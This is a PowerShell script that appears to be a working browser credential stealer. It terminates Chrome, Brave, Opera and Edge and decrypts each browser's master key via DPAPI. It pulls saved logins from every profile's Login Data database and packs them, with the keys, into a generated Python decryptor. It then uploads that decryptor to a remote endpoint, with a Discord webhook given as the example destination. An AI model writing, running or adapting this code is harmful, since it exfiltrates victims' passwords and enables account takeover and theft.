function dcinfosnd {
    param(
        [Parameter (Mandatory = $true)] [String]$hq
    )
    $ErrorActionPreference = 'SilentlyContinue'
    
    Write-Host "Starting credential retrieval for Chrome, Brave, Opera and Edge - Python decryptor will be prepared and sent to $hq"
    Write-Host "======================================================================================"
    
    # Arrays to store all credentials with their associated keys
    $script:allCredentials = @()
    $script:credentialsFound = $false
    
    # Function to process a browser
    function Process-Browser {
        param (
            [string]$browserName,
            [string]$userDataPath,
            [string]$localStatePath
        )
        
        try {
            # Attempt to stop the browser process
            Stop-Process -Name $browserName -ErrorAction SilentlyContinue
            
            Write-Host "Processing $browserName..."
            
            # Check if the browser data exists
            if (-not (Test-Path $userDataPath)) {
                Write-Host "$browserName data not found at $userDataPath"
                return
            }
            
            if (-not (Test-Path $localStatePath)) {
                Write-Host "$browserName Local State not found at $localStatePath"
                return
            }
            
            Add-Type -AssemblyName System.Security
            
            $query = "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0"
            
            $secret = Get-Content -Raw -Path $localStatePath | ConvertFrom-Json
            $secretkey = $secret.os_crypt.encrypted_key
            
            $cipher = [Convert]::FromBase64String($secretkey)
            
            # This is the master key for this browser
            $masterKey = [Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::Unprotect(
                    $cipher[5..$cipher.length], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
            
            # Add the WinSQLite3 class if it doesn't exist
            if (-not ([System.Management.Automation.PSTypeName]'WinSQLite3').Type) {
                Add-Type @"
                    using System;
                    using System.Runtime.InteropServices;
                    public class WinSQLite3
                    {
                        const string dll = "winsqlite3";
                        [DllImport(dll, EntryPoint="sqlite3_open")]
                        public static extern IntPtr Open([MarshalAs(UnmanagedType.LPStr)] string filename, out IntPtr db);
                        [DllImport(dll, EntryPoint="sqlite3_prepare16_v2")]
                        public static extern IntPtr Prepare2(IntPtr db, [MarshalAs(UnmanagedType.LPWStr)] string sql, int numBytes, out IntPtr stmt, IntPtr pzTail);
                        [DllImport(dll, EntryPoint="sqlite3_step")]
                        public static extern IntPtr Step(IntPtr stmt);
                        [DllImport(dll, EntryPoint="sqlite3_column_text16")]
                        static extern IntPtr ColumnText16(IntPtr stmt, int index);
                        [DllImport(dll, EntryPoint="sqlite3_column_bytes")]
                        static extern int ColumnBytes(IntPtr stmt, int index);
                        [DllImport(dll, EntryPoint="sqlite3_column_blob")]
                        static extern IntPtr ColumnBlob(IntPtr stmt, int index);
                        public static string ColumnString(IntPtr stmt, int index)
                        { 
                            return Marshal.PtrToStringUni(WinSQLite3.ColumnText16(stmt, index));
                        }
                        public static byte[] ColumnByteArray(IntPtr stmt, int index)
                        {
                            int length = ColumnBytes(stmt, index);
                            byte[] result = new byte[length];
                            if (length > 0)
                                Marshal.Copy(ColumnBlob(stmt, index), result, 0, length);
                            return result;
                        }
                        [DllImport(dll, EntryPoint="sqlite3_errmsg16")]
                        public static extern IntPtr Errmsg(IntPtr db);
                        public static string GetErrmsg(IntPtr db)
                        {
                            return Marshal.PtrToStringUni(Errmsg(db));
                        }
                    }
"@
            }
            
            # Get all profiles
            $profiles = Get-ChildItem -Path $userDataPath | Where-Object { $_.Name -match "(Profile [0-9]|Default)" } | % { $_.FullName }
            
            foreach ($profile in $profiles) {
                $profileName = Split-Path $profile -Leaf
                $dbPath = Join-Path $profile "Login Data"
                
                if (-not (Test-Path $dbPath)) {
                    continue
                }
                
                $dbH = 0
                if ([WinSQLite3]::Open($dbPath, [ref] $dbH) -ne 0) {
                    Write-Host "Failed to open database: $dbPath"
                    [WinSQLite3]::GetErrmsg($dbh)
                    continue
                }
                
                $stmt = 0
                if ([WinSQLite3]::Prepare2($dbH, $query, -1, [ref] $stmt, [System.IntPtr]0) -ne 0) {
                    Write-Host "Failed to prepare SQL query"
                    [WinSQLite3]::GetErrmsg($dbh)
                    continue
                }
                
                while ([WinSQLite3]::Step($stmt) -eq 100) {
                    $url = [WinSQLite3]::ColumnString($stmt, 0)
                    $username = [WinSQLite3]::ColumnString($stmt, 1)
                    $encryptedPassword = [Convert]::ToBase64String([WinSQLite3]::ColumnByteArray($stmt, 2))
                    
                    # Create a credential object with the browser, profile, and key information
                    $credential = @{
                        browser           = $browserName
                        profile           = $profileName
                        url               = $url
                        username          = $username
                        encryptedPassword = $encryptedPassword
                        key               = $masterKey
                    }
                    
                    # Add to credentials array
                    $script:allCredentials += $credential
                    $script:credentialsFound = $true
                    
                    # Print out the information locally
                    Write-Host "$browserName ($profileName) - Found credentials:"
                    Write-Host "URL: $url"
                    Write-Host "Username: $username"
                    Write-Host "EncryptedPassword: $encryptedPassword"
                    Write-Host "Key: $masterKey"
                    Write-Host "---------------------------"
                }
            }
            
            Write-Host "Finished processing $browserName"
        }
        catch [Exception] {
            Write-Host "$browserName error: $($_.Exception.Message)"
        }
    }
    
    # Process Chrome
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    $chromeLocalState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    Process-Browser -browserName "chrome" -userDataPath $chromePath -localStatePath $chromeLocalState
    
    # Process Brave
    $bravePath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    $braveLocalState = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"
    Process-Browser -browserName "brave" -userDataPath $bravePath -localStatePath $braveLocalState
    
    # Process Opera
    $operaPath = "$env:APPDATA\Opera Software\Opera Stable"
    $operaLocalState = "$env:APPDATA\Opera Software\Opera Stable\Local State"
    Process-Browser -browserName "opera" -userDataPath $operaPath -localStatePath $operaLocalState
    
    # Process Edge
    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    $edgeLocalState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
    Process-Browser -browserName "edge" -userDataPath $edgePath -localStatePath $edgeLocalState
    
    # Debug information
    Write-Host "Debug information:"
    Write-Host "Credentials found: $script:credentialsFound"
    Write-Host "Number of credentials: $($script:allCredentials.Count)"
    Write-Host "Browsers found: $($script:allCredentials | ForEach-Object { $_.browser } | Sort-Object -Unique)"
    Write-Host "======================================================================================"
    
    # Create Python script content in memory if we have credentials
    if ($script:credentialsFound) {
        # Default filename for the decryptor
        $outputFilename = "browser_decrypt.py"
        
        # Build Python script with the credentials and their associated keys
        $pythonScript = @"
from Cryptodome.Cipher import AES
import base64
import sys
import json

def decrypt_password(key, encrypted_password):
    try:
        # Decode the key and encrypted password from base64
        key = base64.b64decode(key)
        encrypted_bytes = base64.b64decode(encrypted_password)
        
        # Check for the v10 format (common in newer Chrome/Brave versions)
        if len(encrypted_bytes) > 3 and encrypted_bytes[:3] == b'v10':
            # Chrome/Brave v10 format: 
            # v10 prefix (3 bytes) + nonce (12 bytes) + ciphertext + tag (16 bytes)
            nonce = encrypted_bytes[3:15]
            ciphertext = encrypted_bytes[15:-16]
            tag = encrypted_bytes[-16:]
            
            # Create cipher and decrypt
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            try:
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode('utf-8')
            except ValueError as mac_error:
                # If MAC check fails, try alternate format
                if "MAC check failed" in str(mac_error):
                    # Some versions may have different byte arrangements
                    # Try with adjusted offsets
                    for offset in range(1, 5):
                        try:
                            alt_nonce = encrypted_bytes[3:15+offset]
                            alt_ciphertext = encrypted_bytes[15+offset:-16]
                            alt_tag = encrypted_bytes[-16:]
                            
                            alt_cipher = AES.new(key, AES.MODE_GCM, nonce=alt_nonce)
                            decrypted = alt_cipher.decrypt_and_verify(alt_ciphertext, alt_tag)
                            return decrypted.decode('utf-8')
                        except:
                            pass
                return f"[Decryption Error: MAC verification failed]"
        
        # Try older Chrome format (v80) without prefix
        else:
            # Try older Chrome format (no prefix, just nonce + ciphertext + tag)
            try:
                # Attempt with 12-byte nonce
                nonce = encrypted_bytes[:12]
                ciphertext = encrypted_bytes[12:-16]
                tag = encrypted_bytes[-16:]
                
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode('utf-8')
            except:
                pass
        
        # If all decryption attempts failed
        return "[Decryption Error: Unknown format]"
    
    except Exception as e:
        return f"[Decryption Error: {str(e)}]"

# List of credentials found with their associated keys
credentials = [
"@

        # Add each credential entry to the Python script
        foreach ($cred in $script:allCredentials) {
            $pythonScript += @"
    {
        "browser": "$($cred.browser)",
        "profile": "$($cred.profile)",
        "url": "$($cred.url)",
        "username": "$($cred.username)",
        "encrypted_password": "$($cred.encryptedPassword)",
        "key": "$($cred.key)"
    },
"@
        }

        # Close the list and add the decryption code
        $pythonScript += @"
]

print("Advanced Browser Password Decryption Tool")
print("=========================================")

success_count = 0
failure_count = 0

# Group by browser and profile for better organization
browser_profile_groups = {}

for cred in credentials:
    browser = cred["browser"]
    profile = cred["profile"]
    group_key = f"{browser} - {profile}"
    
    if group_key not in browser_profile_groups:
        browser_profile_groups[group_key] = []
    
    browser_profile_groups[group_key].append(cred)

# Process each browser/profile group
for group_name, creds in browser_profile_groups.items():
    print(f"\n{group_name}:")
    print("-" * len(group_name) + "-")
    
    for cred in creds:
        url = cred["url"]
        username = cred["username"]
        encrypted_password = cred["encrypted_password"]
        key = cred["key"]
        
        # Use the key associated with this specific credential
        decrypted_password = decrypt_password(key, encrypted_password)
        
        # Count success/failure
        if decrypted_password.startswith("[Decryption Error:"):
            failure_count += 1
        else:
            success_count += 1
        
        # Print credential information
        print(f"URL: {url}")
        print(f"Username: {username}")
        print(f"Password: {decrypted_password}")
        print("---------------------------")

print(f"\nDecryption Summary:")
print(f"Successfully decrypted: {success_count}")
print(f"Failed to decrypt: {failure_count}")
print(f"Total credentials: {len(credentials)}")
"@

        try {
            # Prepare the multipart/form-data content
            $boundary = [guid]::NewGuid().ToString()
            $LF = "`r`n"
            $bodyLines = @(
                "--$boundary",
                "Content-Disposition: form-data; name=`"file`"; filename=`"$outputFilename`"",
                "Content-Type: text/plain$LF",
                $pythonScript,
                "--$boundary--$LF"
            ) -join $LF
            
            $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyLines)
            
            # Send the file
            $result = Invoke-RestMethod -Uri $hq -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBytes
            
            Write-Host "Decryptor script successfully sent to $hq as $outputFilename"
            Write-Host "Total credentials extracted: $($script:allCredentials.Count)"
        }
        catch {
            Write-Host "Error sending decryptor: $($_.Exception.Message)"
            
            # Fallback to saving locally if sending fails
            try {
                $pythonScript | Out-File -FilePath $outputFilename -Encoding utf8
                Write-Host "Sending failed, Python decryption script saved locally at: $outputFilename"
                Write-Host "To use it, install required package: pip install pycryptodomex"
                Write-Host "Then run: python $outputFilename"
                Write-Host "Total credentials extracted: $($script:allCredentials.Count)"
            }
            catch {
                Write-Host "Error creating local Python script: $($_.Exception.Message)"
            }
        }
    }
    else {
        Write-Host "No credentials found. Cannot create decryption script."
        Write-Host "Check if browsers are installed and contain saved passwords."
    }
}

# Example usage:
#dcinfosnd -hq "https://discord.com/api/webhooks/"
